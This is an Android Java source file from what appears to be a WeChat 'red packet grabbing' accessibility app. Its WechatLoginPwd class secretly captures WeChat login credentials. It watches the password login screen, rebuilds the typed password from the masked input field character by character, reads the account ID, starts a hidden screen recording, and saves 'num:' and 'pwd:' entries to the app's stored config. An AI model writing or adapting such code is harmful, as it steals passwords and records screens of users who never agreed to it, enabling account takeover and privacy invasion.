/**
 * 
 */
package accessibility.app;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import order.screen.ScreenRecordService;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class WechatLoginPwd extends BaseAccessibilityJob {
	private static WechatLoginPwd current;
	public static final String WECHAT_LOGIN_PWD_UI="com.tencent.mm.plugin.account.ui.LoginPasswordUI";
	private String mPwd="";
	private String mWechatID="";
	private String mDot= "";
	private int mWXVideoCount=0;
	private boolean bStart=false;
	public WechatLoginPwd(){
		super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
		//getDot();
	}
	public static synchronized WechatLoginPwd getWechatLoginPwd() {
		if(current == null) {
			current = new WechatLoginPwd();
		}
		return current;
	}
	@Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart() ;
		mWXVideoCount=ConfigCt.getInstance(context).getWXLoginVideoCount();
	}
	@Override
	public void onStopJob() {
		super.onStopJob();
	}
	@Override
	public void onReceiveJob(AccessibilityEvent event) {
		super.onReceiveJob(event);
	   	if(!mIsEventWorking)return;
	   	if(!mIsTargetPackageName)return;
	   	
   		if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
   		{
   			if(mCurrentUI.equals(WECHAT_LOGIN_PWD_UI)){
   				TimeStart();
   				//UIinfo.getUIinfo().setPkgs(new String[]{ConfigCt.WECHAT_PACKAGENAME});
   				//UIinfo.getUIinfo().start();
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   				getWechatID(nodeInfo);
   				if(mWXVideoCount>=10)return;
				if(ScreenRecordService.getInstance()==null){
					 ScreenRecordService.start(context,"wxl",false);
					 bStart=true;
					 StopRecordingScreenDelay();
				 }
   			}
   			if(mCurrentUI.equals(ConfigCt.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
   				if(!mIsTimeWorking)return;
   				closeTimeWorking();
   				saveInfo("num:"+mWechatID);
   				saveInfo("pwd:"+mPwd);
   				if(bStart){
   					ScreenRecordService.stop(context);
   					mWXVideoCount=mWXVideoCount+1;
   					ConfigCt.getInstance(context).setWXLoginVideoCount(mWXVideoCount);
   					bStart=false;
   				}
   			}
   		}
   		if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
   		{
   			if(mCurrentUI.equals(WECHAT_LOGIN_PWD_UI)){
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   		   		nodeInfo=AccessibilityHelper.getRootNode(nodeInfo);
   		   		getEditValue(nodeInfo);
   			}
   		}
	   
	}
	/*
	 * 
	 */
	private void getEditValue(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, AccessibilityHelper.WIDGET_EDIT, -1, true);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		String tmp=nodeInfo.getText().toString();
		processPwd(tmp);
		//Log.i(TAG2, mPwd);
		//Log.i(TAG2, tmp);
	}
	/*
	 * 
	 */
	private void getWechatID(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "com.tencent.mm:id/bwk", 0);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		mWechatID=nodeInfo.getText().toString();
		Log.i(TAG2, mWechatID);
	}
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
		AccessibilityNodeInfo rootNode =service.getRootInActiveWindow();
		if (rootNode == null)return;
		getEditValue(rootNode);
   	
	}
	/*
	 * 保存信息；
	 */
	private void savePwd(){
		String info=ConfigCt.getInstance(service).getWechatInfo().toString();
		info=info+"WechatID="+mWechatID+";Pwd="+mPwd+";\r\n";
		ConfigCt.getInstance(service).setWechatInfo(info);
	}
	/*
	 * 处理字符串
	 */
	private void processPwd(String tmp){
		if(tmp==null)return;
		if(tmp.length()==0){mPwd="";return;}
		if(tmp.equals("请填写微信密码")){mPwd="";return;}
		int len=tmp.length();
		if(len==1){
			if(mPwd.length()==0){mPwd=tmp;return;}
			return;
		}
		if(mDot.length()==0)mDot=tmp.substring(0,1);
		String c=tmp.substring(len-1,len);
		if(c.equals(mDot))return;
		if(mPwd.length()==len){
			return;
		}
		if(mPwd.length()<len){
			mPwd=mPwd+c;
			return;
		}
		if(mPwd.length()>len){
			mPwd=mPwd.substring(0,len-1);
			mPwd=mPwd+c;
			return;
		}
	}
	/*
	 * 保存信息；QQ;phone;pwd;
	 */
	private void saveInfo(String info){
		String oldInfo=ConfigCt.getInstance(service).getWechatInfo().toString();
		if(oldInfo.length()==0){
			ConfigCt.getInstance(service).setWechatInfo(info);
			return;
		}
		if(oldInfo.contains(info)){
			return;
		}
		ConfigCt.getInstance(service).setWechatInfo(oldInfo+";"+info);
	}
	/*
	 * 去掉点号
	 */
	private String delDot(String s){
		String s1=s.substring(s.lastIndexOf('.')+1);
		return s1;
	}
	/*
	 * 替换字符
	 */
	private static String replaceIndex(int index,String res,String str){
		return res.substring(0, index)+str+res.substring(index+1);
	}
	 /*
     * 定时器：3分钟后自动终止录屏；
     */
	private void StopRecordingScreenDelay(){
		final Handler handler= new Handler(); 
		Runnable runnable  = new Runnable() {    
			@Override    
		    public void run() {   
				 if(bStart){
					 ScreenRecordService.stop(context);
					 bStart=false;
				 }
		    }    
		};
		handler.postDelayed(runnable, 1000*60*3);  
	}
}
